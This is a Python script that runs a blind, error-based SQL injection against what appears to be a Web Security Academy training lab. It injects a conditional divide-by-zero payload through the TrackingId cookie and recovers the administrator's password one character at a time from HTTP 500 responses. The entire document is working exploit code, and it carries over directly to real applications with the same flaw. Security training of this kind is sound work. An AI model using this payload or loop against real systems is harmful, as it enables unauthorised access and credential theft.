import requests, string

url = 'https://0aca00410363a476c01d5e6200ea00fc.web-security-academy.net/login'
s = requests.Session()

# backend query: `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '{}'`
# given password length is 20 and password consists of lowercase alphanum
password = ''
while len(password)!=20:
	for i in (string.ascii_lowercase + string.digits):
		payload = f"HtMiglHiCbs6VQv4'+||(SELECT+CASE+WHEN+SUBSTR(password,{str(len(password)+1)},1)%3d'{i}'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')||'"
		print(i)
		if (s.get(url, cookies={'TrackingId':payload}).status_code == 500):
			password = password + i
			print(password)
			break

print(password)
